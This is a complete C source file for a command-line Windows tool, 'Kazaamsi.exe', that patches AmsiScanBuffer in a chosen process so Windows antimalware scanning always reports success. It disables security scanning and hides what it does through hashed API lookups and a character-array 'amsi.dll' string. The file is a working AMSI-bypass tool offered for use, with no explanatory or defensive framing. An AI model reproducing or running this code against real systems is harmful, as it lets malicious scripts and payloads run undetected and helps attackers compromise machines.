#include <Windows.h>
#include <stdio.h>
#include <TlHelp32.h>
#include "structs.h"
#include "hashutils.h"

BOOL g_Verbose = FALSE;

typedef HMODULE(WINAPI* fnLoadLibraryA)(LPCSTR);
typedef BOOL(WINAPI* fnVirtualProtectEx)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL(WINAPI* fnWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef HANDLE(WINAPI* fnCreateToolhelp32Snapshot)(DWORD, DWORD);
typedef BOOL(WINAPI* fnModule32FirstW)(HANDLE, LPMODULEENTRY32W);
typedef BOOL(WINAPI* fnModule32NextW)(HANDLE, LPMODULEENTRY32W);
typedef BOOL(WINAPI* fnCloseHandle)(HANDLE);
typedef HANDLE(WINAPI* fnOpenProcess)(DWORD, BOOL, DWORD);

typedef struct _WIN32_API {
    fnLoadLibraryA              pLoadLibraryA;
    fnVirtualProtectEx          pVirtualProtectEx;
    fnWriteProcessMemory        pWriteProcessMemory;
    fnCreateToolhelp32Snapshot  pCreateToolhelp32Snapshot;
    fnModule32FirstW            pModule32FirstW;
    fnModule32NextW             pModule32NextW;
    fnCloseHandle               pCloseHandle;
    fnOpenProcess               pOpenProcess;
}WIN32_API, * PWIN32_API;

BOOL InitializeWin32Api(PWIN32_API pWin32Apis) {
  //  UINT32   k32hash = KERNEL32_CRC32;
    HMODULE hKernel32 = GetModuleHandleH(KERNEL32_CRC32);

    if (!hKernel32) {
        printf("[!] Failed to locate kernel32.dll.\n");
        return FALSE;
    }
    if (g_Verbose)
        printf("[>] Found kernel32.dll at: 0x%p\n", hKernel32);

    pWin32Apis->pLoadLibraryA = (fnLoadLibraryA)GetProcAddressH(hKernel32, LoadLibraryA_CRC32);
    pWin32Apis->pVirtualProtectEx = (fnVirtualProtectEx)GetProcAddressH(hKernel32, VirtualProtectEx_CRC32);
    pWin32Apis->pWriteProcessMemory = (fnWriteProcessMemory)GetProcAddressH(hKernel32, WriteProcessMemory_CRC32);
    pWin32Apis->pCreateToolhelp32Snapshot = (fnCreateToolhelp32Snapshot)GetProcAddressH(hKernel32, CreateToolhelp32Snapshot_CRC32);
    pWin32Apis->pModule32FirstW = (fnModule32FirstW)GetProcAddressH(hKernel32, Module32FirstW_CRC32);
    pWin32Apis->pModule32NextW = (fnModule32NextW)GetProcAddressH(hKernel32, Module32NextW_CRC32);
    pWin32Apis->pCloseHandle = (fnCloseHandle)GetProcAddressH(hKernel32, CloseHandle_CRC32);
    pWin32Apis->pOpenProcess = (fnOpenProcess)GetProcAddressH(hKernel32, OpenProcess_CRC32);

    if (!pWin32Apis->pLoadLibraryA || !pWin32Apis->pVirtualProtectEx || !pWin32Apis->pWriteProcessMemory ||
        !pWin32Apis->pCreateToolhelp32Snapshot || !pWin32Apis->pModule32FirstW ||
        !pWin32Apis->pModule32NextW || !pWin32Apis->pCloseHandle || !pWin32Apis->pOpenProcess) {
        printf("[!] Failed to resolve one or more kernel32 functions.\n");
        return FALSE;
    }

    if (g_Verbose) {
        printf("[>] LoadLibraryA: 0x%p\n", (PVOID)pWin32Apis->pLoadLibraryA);
        printf("[>] VirtualProtectEx: 0x%p\n", (PVOID)pWin32Apis->pVirtualProtectEx);
        printf("[>] WriteProcessMemory: 0x%p\n", (PVOID)pWin32Apis->pWriteProcessMemory);
        printf("[>] CreateToolhelp32Snapshot: 0x%p\n", (PVOID)pWin32Apis->pCreateToolhelp32Snapshot);
        printf("[>] Module32FirstW: 0x%p\n", (PVOID)pWin32Apis->pModule32FirstW);
        printf("[>] Module32NextW: 0x%p\n", (PVOID)pWin32Apis->pModule32NextW);
        printf("[>] CloseHandle: 0x%p\n", (PVOID)pWin32Apis->pCloseHandle);
        printf("[>] OpenProcess: 0x%p\n", (PVOID)pWin32Apis->pOpenProcess);
    }

    return TRUE;
}

PVOID GetRemoteModBase(DWORD targetPid, DWORD moduleHash, WIN32_API api) {
    
    MODULEENTRY32   modEntry        =   { 0 };
                    modEntry.dwSize =   sizeof(modEntry);

    HANDLE hSnapshot = api.pCreateToolhelp32Snapshot(TH32CS_SNAPMODULE, targetPid);

    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("[!] CreateToolhelp32Snapshot failed. Error: %d\n", GetLastError());
        return NULL;
    }
    // Convert to ascii then compare hash
    if (api.pModule32FirstW(hSnapshot, &modEntry)) {
        do {
                char    modNameA[MAX_PATH] = { 0 },
                        upperModNameA[MAX_PATH]    = { 0 };
                DWORD   thisModHash;

            WideCharToMultiByte(CP_ACP, 0, modEntry.szModule, -1, modNameA, MAX_PATH, NULL, NULL);
 
            for (int i = 0; i < sizeof(modNameA); i++) {
                if (modNameA[i] >= 'a' && modNameA[i] <= 'z')
                    upperModNameA[i] = modNameA[i] - 'a' + 'A';
                else
                    upperModNameA[i] = modNameA[i];
            }
            
            // Hash and compare
            thisModHash = CRC32BA(upperModNameA);
            
            if (thisModHash == moduleHash) {
                CloseHandle(hSnapshot);
                return modEntry.modBaseAddr;
            }
        } while (api.pModule32NextW(hSnapshot, &modEntry));
    }

    api.pCloseHandle(hSnapshot);
    return NULL;
}

PVOID GetRemoteFuncAddr(IN DWORD dwTargetPid, WIN32_API api) {  
    
    char dllNameA[]      =      { 'a','m','s','i','.','d','l','l', 0 };

    HMODULE hLocalMod = api.pLoadLibraryA(dllNameA);
    if (!hLocalMod) {
        printf("[!] LoadLibraryA failed. Error: %d\n", GetLastError());
        return NULL;
    }

    PBYTE localFuncAddr = (PBYTE)GetProcAddressH(hLocalMod, AmsiScanBuffer_CRC32);
    if (!localFuncAddr) {
        printf("[!] GetProcAddress failed. Error: %d\n", GetLastError());
        return NULL;
    }
    SIZE_T funcOffset = (SIZE_T)(localFuncAddr - (PBYTE)hLocalMod);

    PBYTE remoteBaseAddr = (PBYTE)GetRemoteModBase(dwTargetPid, AMSI_CRC32, api);
    if (!remoteBaseAddr) {
        printf("[!] Failed to find target module in remote process.\n");
        return NULL;
    }

    PVOID remoteFuncAddr = remoteBaseAddr + funcOffset;
    if (g_Verbose)
        printf("[>] Remote AmsiScanBuffer address: 0x%p\n", remoteFuncAddr);

    return remoteFuncAddr;
}

BOOL PatchRemoteFunc(HANDLE hProcess, PVOID pRemoteFunc, WIN32_API api) {   

    char patchBytes[] = { 0x31, 0xC0, 0xC3 };
    
    PVOID  pageBase = pRemoteFunc;
    SIZE_T pageSize = 0x1000;
    DWORD  oldProtect = 0;

    // change page to read/write
    if (!api.pVirtualProtectEx(hProcess, pageBase, pageSize, PAGE_READWRITE, &oldProtect)) {
        printf("[!] VirtualProtectEx failed: %u\n", GetLastError());
        return FALSE;
    }

    // write patch bytes
    if (!api.pWriteProcessMemory(hProcess, pRemoteFunc, patchBytes, sizeof(patchBytes), NULL)) {
        printf("[!] WriteProcessMemory failed: %u\n", GetLastError());
        return FALSE;
    }

    // restore original protection
    if (!api.pVirtualProtectEx(hProcess, pageBase, pageSize, oldProtect, &oldProtect)) {
        printf("[!] VirtualProtectEx (restore) failed: %u\n", GetLastError());
        return FALSE;
    }

    printf("[>] Patch applied successfully.\n");
    return TRUE;

}

int main(int argc, char** argv) {

    WIN32_API       api         =   { 0 };
    DWORD           targetPid   =   0;
    PVOID           targetFunc  =   NULL;

    if (argc < 2 || argc > 3) {
        printf("Usage: Kazaamsi.exe <PID> [-v]\n");
        return -1;
    }

    targetPid = strtoul(argv[1], NULL, 10);
    if (targetPid == 0) {
        printf("[!] Invalid PID: %s\n", argv[1]);
        return -1;
    }

    g_Verbose = (argc == 3 && strcmp(argv[2], "-v") == 0);

    if (!InitializeWin32Api(&api)) {
        printf("[!] Could not resolve APIs.\n");
        return -1;
    }

    targetFunc = GetRemoteFuncAddr(targetPid, api);
    if (!targetFunc) {
        printf("[!] Failed to calculate remote function address.\n");
        return -1;
    }

    if (g_Verbose)
        printf("[>] Opening handle to PID %lu...\n", targetPid);

    HANDLE hProcess = api.pOpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, targetPid);
    if (!hProcess) {
        printf("[!] OpenProcess failed. Error: %d\n", GetLastError());
        return -1;
    }

    if (g_Verbose)
        printf("[>] Applying patch to remote process...\n");

    if (!PatchRemoteFunc(hProcess, targetFunc, api)) {
        api.pCloseHandle(hProcess);
        return -1;
    }

    if (g_Verbose)
        printf("[>] Cleaning up...\n");

    api.pCloseHandle(hProcess);
    return 0;
}
